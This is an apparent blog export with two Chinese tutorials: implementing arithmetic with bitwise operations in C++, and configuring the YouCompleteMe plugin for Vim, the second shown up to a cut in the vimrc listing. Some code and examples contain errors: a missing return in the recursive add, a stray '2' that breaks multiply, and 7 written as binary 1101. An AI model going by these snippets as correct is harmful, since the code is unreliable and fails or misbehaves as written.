    <content><![CDATA[<p>计算机内部实现数据的加减乘除运算是通过对二进制位运算来实现的，基本运算” + - × ÷ “ 均可转换为位运算。</p>
<a id="more"></a>

<p>在介绍加减乘除运算前，我们需要了解一些基本的位运算。</p>
<p>与 &amp;<br>1 and 1 = 1<br>1 and 0 = 0<br>0 and 1 = 0<br>0 and 0 = 0</p>
<p>或 |<br>1 or 1 = 1<br>1 or 0 = 1<br>0 or 1 = 1<br>0 or 0 = 0</p>
<p>异或 ^<br>1 xor 1 = 0<br>1 xor 0 = 1<br>0 xor 1 = 1<br>0 xor 0 = 0</p>
<h2 id="加法运算"><a href="#加法运算" class="headerlink" title="加法运算"></a>加法运算</h2><p>假如右两个32位的int整数：</p>
<blockquote>
<p>a=10: 00000000000000000000000000001010<br>b=13: 00000000000000000000000000001101</p>
</blockquote>
<p>将这两个数10和13相加：<br>a=01010 (10)<br>b=01101 (13)<br>c=10111 (23)</p>
<p>把上面的二进制分割为每一位后a+b=c</p>
<table>
<thead>
<tr>
<th>a</th>
<th>b</th>
<th>xor ^</th>
<th align="left">and &amp;</th>
<th>c</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1</td>
<td>1</td>
<td align="left">0</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>1</td>
<td align="left">0</td>
<td>1</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>1</td>
<td align="left">0</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>0</td>
<td align="left">1</td>
<td>0</td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>0</td>
<td align="left">0</td>
<td>1</td>
</tr>
</tbody></table>
<p>我们发现 位异或^ 单纯的将两个数相加，不过并没有考虑 <strong>进位</strong> )，但是 与运算&amp; 能够表示两个二进制相加是否发生了进位（如上表所示）。</p>
<p>也就是说，利用 xor 将两个数相加，and 判断是否有进位，如果有，那个满2进1位 carry&lt;&lt;=1</p>
<blockquote>
<p>sum = a^b<br>carry = a&amp;b<br>carry &lt;&lt;= 1</p>
</blockquote>
<p>假如这样计算会发生什么?</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">add(a,b)</span><br><span class="line">a=<span class="number">01010</span></span><br><span class="line">b=<span class="number">01101</span></span><br><span class="line"></span><br><span class="line">sum=a^b =&gt; <span class="number">00111</span> <span class="comment">// 求和</span></span><br><span class="line">carry=a&amp;b =&gt; <span class="number">01000</span> <span class="comment">// 求进位: 1&amp;1</span></span><br><span class="line">carry=carry&lt;&lt;<span class="number">1</span> =&gt; <span class="number">10000</span> <span class="comment">//满2进1</span></span><br><span class="line"></span><br><span class="line">如果carry进位!=<span class="number">0</span>,否则就结束</span><br><span class="line">假设</span><br><span class="line">a=sum=  <span class="number">00111</span></span><br><span class="line">b=carry=<span class="number">10000</span></span><br><span class="line">重复之前的步骤...此时新的a=sum,b=carry</span><br><span class="line">sum=a^b =&gt; <span class="number">10111</span></span><br><span class="line">carry=a&amp;b =&gt; <span class="number">00000</span></span><br><span class="line">carry=carry&lt;&lt;<span class="number">1</span> =&gt; <span class="number">00000</span></span><br><span class="line"></span><br><span class="line">此时sum=<span class="number">10111</span> 且 carry=<span class="number">0</span> </span><br><span class="line">结果正确！</span><br></pre></td></tr></table></figure>

<p>sum=a^b 表明对a和b求和（不考虑进位），而 (a&amp;b)&lt;&lt;1 表明求a和b中哪个位发生了进位，并且将该位置于最高位(通过左移一位)</p>
<p>因此C++代码如下:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 迭代1，按照上面的思路来写</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> carry=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum=a^b;</span><br><span class="line">        carry=(a&amp;b)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">        a=sum;</span><br><span class="line">        b=carry;</span><br><span class="line">    &#125; <span class="keyword">while</span> (carry); <span class="comment">//判断是否有进位。如无，则表示没有可以加的值</span></span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 迭代2</span></span><br><span class="line"><span class="comment">// 还可以修改为以下代码</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum=a; </span><br><span class="line">    <span class="keyword">int</span> carry=b;</span><br><span class="line">    <span class="keyword">while</span> (carry)&#123;</span><br><span class="line">        <span class="keyword">int</span> temp=sum;</span><br><span class="line">        sum=temp^carry; <span class="comment">//a+b</span></span><br><span class="line">        carry=(temp&amp;carry)&lt;&lt;<span class="number">1</span>; <span class="comment">//进1位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>) <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">int</span> carry=(a&amp;b)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> sum=a^b;</span><br><span class="line">    <span class="comment">// 将a+b转化为sum+carry</span></span><br><span class="line">    add(sum,carry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="减法运算"><a href="#减法运算" class="headerlink" title="减法运算"></a>减法运算</h2><p>由于计算机只会进行加法运算，那么减法就可以转变为加法运算，这涉及到计算机的原码反码和补码知识了。这里简单提下</p>
<ul>
<li>正数的 <strong>原码=反码=补码</strong></li>
<li>负数的 原码=正数的原码且最高位置为1。<br>如32位-3原码可表示为 10000000000000000000000000000011</li>
<li>负数的反码为其原码的最高位1不变，其余位取反(~)<br>如32位-3反码可表示为 11111111111111111111111111111100</li>
<li>负数的补码为其反码+1<br>如32位-3补码可表示为 11111111111111111111111111111101</li>
</ul>
<p><strong>目前补码普遍是计算机内部数值的表示方式，它很好的解决了 +0 和 -0的问题</strong></p>
<p>因此减法运算就变得十分简单的<br>代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a - b = a + (-b) = a + (~b + 1 )</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">subtract</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> negative=add(~b,<span class="number">1</span>); <span class="comment">// ~b + 1</span></span><br><span class="line">    <span class="keyword">return</span> add(a,negative); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>负数和正数转换(设x&gt;0)：</p>
<blockquote>
<p>-x=(~x+1)  如 -10=(~10+1)<br>x=~(-x-1)  如 10=~(-10-1)<br>x=~(-x)+1 如 10=~(-10)+1</p>
</blockquote>
<h2 id="乘法运算"><a href="#乘法运算" class="headerlink" title="乘法运算"></a>乘法运算</h2><p>其实乘法也就是多个加法的累积求和，在我们小学时，25×5应该是这样计算的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    2 5</span><br><span class="line"> ×  0 5</span><br><span class="line"> ————————</span><br><span class="line">  1 2 5</span><br><span class="line">+ 0 0</span><br><span class="line"> ————————</span><br><span class="line">  1 2 5</span><br></pre></td></tr></table></figure>

<p>二进制也可以这样计算，不过就是满2进1。这里还是以25×5=125为例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">       0 1 1 0 0 1   = 25</span><br><span class="line">     ×       1 0 1   = 5</span><br><span class="line">————————————————————</span><br><span class="line">       0 1 1 0 0 1   = 25</span><br><span class="line">+    0 0 0 0 0 0     = 0</span><br><span class="line">+  0 1 1 0 0 1       = 25&lt;&lt;2 = 25*2^2=120</span><br><span class="line">——————————————————— </span><br><span class="line">   0 1 1 1 1 1 0 1   = 125 = 25+120</span><br></pre></td></tr></table></figure>

<p>将乘法分解为加法即可实现位运算，大致思路如下，<br>存在一个函数 <code>int multiply(int a,int b);</code><br>1.若b&lt;0，则对b求负化为<strong>正数</strong>，同时设置一个标识neagtive_mask记录该b是负数<br>2.对除数b不断右移b&gt;&gt;=1并且取得b最低位的值(0或1)，直到b=0<br>3.若为1，则add操作得sum<br>4.a不断左移1位 a&lt;&lt;=1<br>5.结尾判断neagtive_mask来设置sum的正负</p>
<p>注意，除数如果为负数，假设为 11111111111111111111111111111011 (-5)，那么其右移得不到b=0，至于被除数可以小于0<br>具体代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">multiply</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判断正负</span></span><br><span class="line">    <span class="keyword">bool</span> neagtive_mask=(b&lt;<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(b&lt;<span class="number">0</span>)&#123;<span class="number">2</span></span><br><span class="line">        b=~(b<span class="number">-1</span>); <span class="comment">// 化为正数: -x=(~x+1) &lt;-&gt; x=-(-x-1) (x&gt;0) </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (b) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b&amp;<span class="number">0x1</span>)&#123; <span class="comment">//取最低位，最低位为1，求和</span></span><br><span class="line">            sum=add(sum,a); <span class="comment">//累加</span></span><br><span class="line">        &#125;</span><br><span class="line">        b&gt;&gt;=<span class="number">1</span>; <span class="comment">// 除数右移将最低位溢出</span></span><br><span class="line">        a&lt;&lt;=<span class="number">1</span>; <span class="comment">// 被除数左移</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(neagtive_mask)&#123;</span><br><span class="line">        sum=~(sum<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="除法运算"><a href="#除法运算" class="headerlink" title="除法运算"></a>除法运算</h2><p>除法就相对来说复杂了，不过除法类似减法，不断地减去除数得到商，最后剩下余数<br>这里还是以小学数学除法为例子 37÷3=12…1</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">     <span class="number">12</span> </span><br><span class="line">  -----</span><br><span class="line"><span class="number">3</span> | <span class="number">37</span></span><br><span class="line">  - <span class="number">3</span></span><br><span class="line">   ----	</span><br><span class="line">      <span class="number">7</span></span><br><span class="line">    - <span class="number">6</span>   </span><br><span class="line">    ---</span><br><span class="line">      <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>其中这操作还可以转换为</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">步骤<span class="number">1</span></span><br><span class="line">     <span class="number">1</span></span><br><span class="line">   -----</span><br><span class="line"><span class="number">30</span> | <span class="number">37</span>    </span><br><span class="line">   - <span class="number">30</span></span><br><span class="line">    ----	</span><br><span class="line">	  <span class="number">7</span>  </span><br><span class="line">步骤<span class="number">2</span></span><br><span class="line">    <span class="number">2</span></span><br><span class="line">   ----</span><br><span class="line"> <span class="number">3</span>| <span class="number">7</span>   </span><br><span class="line">   <span class="number">-6</span></span><br><span class="line">    ---	</span><br><span class="line">    <span class="number">1</span></span><br><span class="line">  </span><br><span class="line">商: <span class="number">1</span>*<span class="number">10</span>^<span class="number">1</span> + <span class="number">2</span>*<span class="number">10</span>^<span class="number">0</span> = <span class="number">10</span>+<span class="number">2</span>=<span class="number">12</span></span><br><span class="line">最后余下<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>发现了什么吗？ </p>
<p>现在我们把上面十进制换成二进制</p>
<blockquote>
<p>37: 100101<br>3:       0011<br>7:       1101</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">步骤<span class="number">1</span></span><br><span class="line">         <span class="number">1</span></span><br><span class="line">      --------</span><br><span class="line"> <span class="number">11000</span>|	<span class="number">100101</span> -&gt;a=<span class="number">37</span>  </span><br><span class="line">       - <span class="number">11000</span> </span><br><span class="line">    	-------	</span><br><span class="line">	      <span class="number">1101</span> -&gt;<span class="number">7</span></span><br><span class="line">步骤<span class="number">2</span></span><br><span class="line">       <span class="number">1</span></span><br><span class="line">    ------</span><br><span class="line"><span class="number">1100</span>| <span class="number">1101</span>  -&gt;a=<span class="number">7</span></span><br><span class="line">   -  <span class="number">1100</span> </span><br><span class="line">    ------	</span><br><span class="line">        <span class="number">1</span></span><br><span class="line">步骤<span class="number">3</span></span><br><span class="line">         <span class="number">0</span></span><br><span class="line">    ------</span><br><span class="line"> <span class="number">110</span>|   <span class="number">1</span> </span><br><span class="line">   -    <span class="number">0</span> </span><br><span class="line">    ------	</span><br><span class="line">        <span class="number">1</span></span><br><span class="line">商: <span class="number">1</span>*<span class="number">2</span>^<span class="number">3</span> + <span class="number">1</span>*<span class="number">2</span>^<span class="number">2</span> + <span class="number">0</span> </span><br><span class="line">  = <span class="number">1</span>&lt;&lt;<span class="number">3</span> + <span class="number">1</span>&lt;&lt;<span class="number">2</span> + <span class="number">0</span></span><br><span class="line">  = <span class="number">8</span>+<span class="number">4</span>+<span class="number">0</span>=<span class="number">12</span></span><br><span class="line">最后余下<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>在上面例子中，除数3<strong>左移3位</strong>变为 11000，接着除数3<strong>左移2位</strong>变为 1100，最后<strong>左移1位</strong>变为 110。<br>此时发现 <strong>被除数1</strong> 小于 <strong>除数110</strong>，因此商为0（C++语言中除法运算导致返回一个<strong>整数</strong>）。<br>因此如果发现被除数小于除数，那么直接返回0即可。</p>
<p>于是要先找到除数应该左移的位数，且使得除数是&lt;=除数<br>然后利用减法 :a=subtract(a,b&lt;&lt;nMove)</p>
<p>利用加法 :当前累加值r=add(前一个值累加值r,1&lt;&lt;nMove)</p>
<p>代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divide</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nMove=<span class="number">0</span>; </span><br><span class="line">    <span class="keyword">bool</span> negative_mask=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(a&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        a=~(a<span class="number">-1</span>); <span class="comment">// 化正</span></span><br><span class="line">        negative_mask=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(b&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        b=~(b<span class="number">-1</span>); <span class="comment">// 化正</span></span><br><span class="line">        <span class="comment">// 同号得正，异号的负</span></span><br><span class="line">        negative_mask=negative_mask==<span class="literal">false</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a&lt;b)&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="comment">// 找到除数应该左移的位数，且使得除数是&lt;=除数</span></span><br><span class="line">    <span class="keyword">for</span> ( nMove = <span class="number">0</span>; nMove&lt;<span class="number">32</span>;nMove++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((b&lt;&lt;nMove)&gt;=a)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = nMove; i &gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">int</span> t=b&lt;&lt;i;</span><br><span class="line">        <span class="keyword">if</span>(a&lt;t) <span class="comment">// 被除数小于除数</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        a=subtract(a,t);</span><br><span class="line">        r=add(r,<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(negative_mask)&#123;</span><br><span class="line">        r=~(r<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="输出二进制"><a href="#输出二进制" class="headerlink" title="输出二进制"></a>输出二进制</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printBinary</span><span class="params">(<span class="keyword">int</span> number)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> strBinary[<span class="number">33</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> bitmask = <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> k = ((number &amp; bitmask)&gt;&gt;<span class="number">31</span>)?<span class="string">'1'</span>:<span class="string">'0'</span>;</span><br><span class="line">		strBinary[i] = k;</span><br><span class="line">		number &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; strBinary &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="简单数据交换"><a href="#简单数据交换" class="headerlink" title="简单数据交换"></a>简单数据交换</h2><p>利用xor位异或来实现值交换</p>
<p>原理:</p>
<blockquote>
<p>a ^ a = 0<br>a ^ 0 = a<br>0 ^ a = a </p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">10</span>,b=<span class="number">20</span>;</span><br><span class="line">a=a^b; <span class="comment">// a=a^b;</span></span><br><span class="line">b=a^b; <span class="comment">// b=(a^b)^b=a^(b^b)=a^0=a;</span></span><br><span class="line">a=a^b; <span class="comment">// a=(a^b)^a=(a^a)^b=0^b=b;</span></span><br></pre></td></tr></table></figure>

<p>bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Vim YCM配置</title>
    <url>/linux-ycm-vim/</url>
    <content><![CDATA[<p>由于之前不小心把vim的配置删了，致使之前的那篇文章无法访问，但为了回应有关网友的回复，特此重新编辑了vim的ycm配置。:)</p>
<p>YCM全称 YouCompleteMe，是一个vim插件，但是却是一个能够使代码自动补全的工具。虽然如此，但也还是无法与专用IDE相媲美，不过对于vim党来说却是一个十分有趣的插件。</p>
<a id="more"></a>

<h2 id="安装前"><a href="#安装前" class="headerlink" title="安装前"></a>安装前</h2><p>要使VIM配置YCM，则必须确保Vim支持Python2和Python3，可以用 <code>vim --version</code> 查看是否支持。否则请自行从源代码安装vim。</p>
<p>我的系统是archlinux，vim版本为8.2</p>
<h2 id="安装YCM-Vundle"><a href="#安装YCM-Vundle" class="headerlink" title="安装YCM(Vundle)"></a>安装YCM(Vundle)</h2><p>YCM github： <a href="https://github.com/ycm-core/YouCompleteMe" target="_blank" rel="noopener">https://github.com/ycm-core/YouCompleteMe</a></p>
<p>推荐通过 <strong>Vundle</strong> 安装 YCM，在此之前，需要安装 Vundle： <a href="https://github.com/VundleVim/Vundle.vim" target="_blank" rel="noopener">https://github.com/VundleVim/Vundle.vim</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim</span><br></pre></td></tr></table></figure>

<p>之后可以编辑 ~/.vimrc 文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> nocompatible</span><br><span class="line">filetype off </span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rtp+=~/.vim/bundle/Vundle.vim</span><br><span class="line">call vundle<span class="comment">#begin()</span></span><br><span class="line">...</span><br><span class="line">Plugin <span class="string">'VundleVim/Vundle.vim'</span></span><br><span class="line">...</span><br><span class="line">call vundle<span class="comment">#end()</span></span><br><span class="line">filetype plugin indent on</span><br></pre></td></tr></table></figure>

<p>一般来说，vundle常用用法如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:PluginList       - 列举配置插件</span><br><span class="line">:PluginInstall    - 安装 ‘Plugin’ 之后的插件</span><br><span class="line">:PluginUpdate	  - 更新插件</span><br><span class="line">:PluginSearch foo - 寻找插件 foo并添加的本地配置</span><br><span class="line">:PluginClean      - 删除未被使用的插件</span><br></pre></td></tr></table></figure>

<h2 id="支持C-C"><a href="#支持C-C" class="headerlink" title="支持C/C++"></a>支持C/C++</h2><p>要使YCM支持C语言的自动补全，还需要配置YCM，首先在 .vimrc 添加一行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">call vundle<span class="comment">#begin()</span></span><br><span class="line">. . . </span><br><span class="line">Plugin <span class="string">'Valloric/YouCompleteMe’</span></span><br><span class="line"><span class="string">. . .</span></span><br><span class="line"><span class="string">call vundle#end()</span></span><br></pre></td></tr></table></figure>

<p>进入vim后 <code>:PluginInstall</code> ，然后在进行编译YCM，当然还有 ./install.sh –all ，不过我就不怎么配置了。 注意还要安装 <code>cmake</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.vim/bundle/YouCompleteMe</span><br><span class="line">./install.sh --clang-completer</span><br></pre></td></tr></table></figure>

<p>如果是Git YCM的，那么还需要在该目录下执行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ycm-core/YouCompleteMe.git</span><br><span class="line">git submodule update --init --recursive</span><br></pre></td></tr></table></figure>

<h2 id="下载安装libclang"><a href="#下载安装libclang" class="headerlink" title="下载安装libclang"></a>下载安装libclang</h2><p>由于我的系统是archlinux，所以可以直接 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S clang boost llvm-libs</span><br></pre></td></tr></table></figure>

<p>其他linux系统比如Ubuntu，需要安装 llvm，clang，libclang，libboost。</p>
<h2 id="编译构建-ycm-core-库"><a href="#编译构建-ycm-core-库" class="headerlink" title="编译构建 ycm_core 库"></a>编译构建 ycm_core 库</h2><p>编译构建ycm_core库需要安装 cmake和python3-dev<br>创建一个用于存放编译过程的产生的文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mkdir ~/ycm_build</span></span><br><span class="line"><span class="comment"># cd ~/ycm_build</span></span><br><span class="line"><span class="comment"># cmake -G "Unix Makefiles" -DUSE_SYSTEM_BOOST=ON -DUSE_SYSTEM_LIBCLANG=ON . ~/.vim/bundle/YouCompleteMe/third_party/ycmd/cpp</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">-- The C compiler identification is GNU 9.1.0</span><br><span class="line">-- The CXX compiler identification is GNU 9.1.0</span><br><span class="line">-- Check <span class="keyword">for</span> working C compiler: /usr/bin/cc</span><br><span class="line">-- Check <span class="keyword">for</span> working C compiler: /usr/bin/cc -- works</span><br><span class="line">-- Detecting C compiler ABI info</span><br><span class="line">-- Detecting C compiler ABI info - <span class="keyword">done</span></span><br><span class="line">-- Detecting C compile features</span><br><span class="line">-- Detecting C compile features - <span class="keyword">done</span></span><br><span class="line">-- Check <span class="keyword">for</span> working CXX compiler: /usr/bin/c++</span><br><span class="line">-- Check <span class="keyword">for</span> working CXX compiler: /usr/bin/c++ -- works</span><br><span class="line">-- Detecting CXX compiler ABI info</span><br><span class="line">-- Detecting CXX compiler ABI info - <span class="keyword">done</span></span><br><span class="line">-- Detecting CXX compile features</span><br><span class="line">-- Detecting CXX compile features - <span class="keyword">done</span></span><br><span class="line">-- Found PythonLibs: /usr/lib/libpython2.7.so (found suitable version <span class="string">"2.7.16"</span>, minimum required is <span class="string">"2.7"</span>) </span><br><span class="line">-- Using libclang to provide semantic completion <span class="keyword">for</span> C/C++/ObjC</span><br><span class="line">-- Found Boost: /usr/include (found version <span class="string">"1.69.0"</span>) found components:  filesystem regex </span><br><span class="line">-- Using external libclang: /usr/lib/libclang.so.8</span><br><span class="line">-- NOT using clang-tidy <span class="keyword">for</span> static analysis.</span><br><span class="line">-- Configuring <span class="keyword">done</span></span><br><span class="line">-- Generating <span class="keyword">done</span></span><br><span class="line">-- Build files have been written to: /home/joxrays/ycm_build</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmake --build . --target ycm_core --config Release</span></span><br><span class="line">	--config Release 针对 Windows，对于Linux/Unix忽略</span><br><span class="line">若无错误之后可看到 `Linking CXX shared library /home/joxrays/.vim/bundle/YouCompleteMe/third_party/ycmd/ycm_core.so`</span><br></pre></td></tr></table></figure>

<p>至此YCM_CORE编译完成，接下来就可以</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp ~/.vim/bundle/YouCompleteMe/third_party/ycmd/examples/.ycm_extra_conf.py ~/.vim/</span><br></pre></td></tr></table></figure>

<h2 id="vim配置文件-插件"><a href="#vim配置文件-插件" class="headerlink" title="vim配置文件+插件"></a>vim配置文件+插件</h2><p>我先把我的vimrc配置文件贴出了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">set</span> nocp</span><br><span class="line"><span class="built_in">set</span> modelines=0</span><br><span class="line"><span class="built_in">set</span> backspace=2</span><br><span class="line">syntax on </span><br><span class="line">autocmd InsertLeave * se nocul</span><br><span class="line">autocmd InsertEnter * se cul</span><br><span class="line"><span class="built_in">set</span> smartindent </span><br><span class="line"><span class="built_in">set</span> autoindent</span><br><span class="line"><span class="built_in">set</span> confirm </span><br><span class="line"><span class="built_in">set</span> tabstop=4 </span><br><span class="line"><span class="built_in">set</span> softtabstop=4</span><br><span class="line"><span class="built_in">set</span> shiftwidth=4 </span><br><span class="line"><span class="built_in">set</span> expandtab </span><br><span class="line"><span class="built_in">set</span> number</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">history</span>=50  </span><br><span class="line"><span class="built_in">set</span> hlsearch</span><br><span class="line"><span class="built_in">set</span> incsearch</span><br><span class="line"><span class="built_in">set</span> gdefault</span><br><span class="line"><span class="built_in">set</span> encoding=utf-8</span><br><span class="line"><span class="built_in">set</span> fileencodings=utf-8,ucs-bom,<span class="built_in">shift</span>-jis,gb18030,gbk,gb2312,cp936,utf-16,big5,euc-jp,latin1</span><br><span class="line"><span class="built_in">set</span> guifont=Menlo:h16:cANSI </span><br><span class="line"><span class="built_in">set</span> langmenu=zn_CN.UTF-8</span><br><span class="line"><span class="built_in">set</span> helplang=cn </span><br><span class="line"><span class="built_in">set</span> ruler </span><br><span class="line"><span class="built_in">set</span> laststatus=1 </span><br><span class="line"><span class="built_in">set</span> showcmd </span><br><span class="line"><span class="built_in">set</span> scrolloff=3</span><br><span class="line"><span class="built_in">set</span> showmatch </span><br><span class="line"><span class="built_in">set</span> matchtime=5</span><br><span class="line"><span class="built_in">set</span> autowrite </span><br><span class="line"><span class="built_in">set</span> wildmenu  </span><br><span class="line"><span class="built_in">set</span> linespace=2 </span><br><span class="line"><span class="built_in">set</span> whichwrap=b,s,&lt;,&gt;,[,] </span><br><span class="line"><span class="built_in">set</span> foldenable  </span><br><span class="line"><span class="built_in">set</span> cursorline </span><br><span class="line"><span class="built_in">set</span> magic  </span><br><span class="line"><span class="built_in">set</span> ignorecase</span><br><span class="line"><span class="built_in">set</span> background=dark</span><br><span class="line"><span class="built_in">set</span> t_Co=256   </span><br><span class="line"><span class="built_in">set</span> mouse=i </span><br><span class="line"><span class="built_in">set</span> backspace=indent,eol,start</span><br><span class="line"><span class="built_in">set</span> nocompatible</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rtp+=~/.vim/bundle/Vundle.vim</span><br><span class="line">call vundle<span class="comment">#begin()</span></span><br><span class="line">Plugin <span class="string">'VundleVim/Vundle.vim'</span></span><br><span class="line">Plugin <span class="string">'Valloric/YouCompleteMe'</span></span><br><span class="line">Plugin <span class="string">'altercation/vim-colors-solarized'</span></span><br><span class="line">Plugin <span class="string">'scrooloose/nerdtree'</span></span><br><span class="line">Plugin <span class="string">'scrooloose/nerdcommenter'</span></span><br><span class="line">Plugin <span class="string">'majutsushi/tagbar'</span></span><br><span class="line">Plugin <span class="string">'whatyouhide/vim-gotham'</span></span><br><span class="line">Plugin <span class="string">'vim-airline/vim-airline'</span></span><br><span class="line">Plugin <span class="string">'vim-airline/vim-airline-themes'</span></span><br><span class="line"></span><br><span class="line">call vundle<span class="comment">#end()</span></span><br><span class="line"></span><br><span class="line">filetype plugin indent on</span><br><span class="line"></span><br><span class="line">autocmd CursorMovedI,InsertLeave * <span class="keyword">if</span> pumvisible() == 0|silent! pclose|endif</span><br><span class="line">autocmd InsertLeave * <span class="keyword">if</span> pumvisible() == 0|pclose|endif</span><br><span class="line"><span class="built_in">set</span> completeopt=longest,menu</span><br><span class="line">highlight Pmenu    guibg=darkgrey  guifg=black</span><br><span class="line">highlight PmenuSel guibg=lightgrey guifg=black</span><br><span class="line">inoremap &lt;expr&gt; 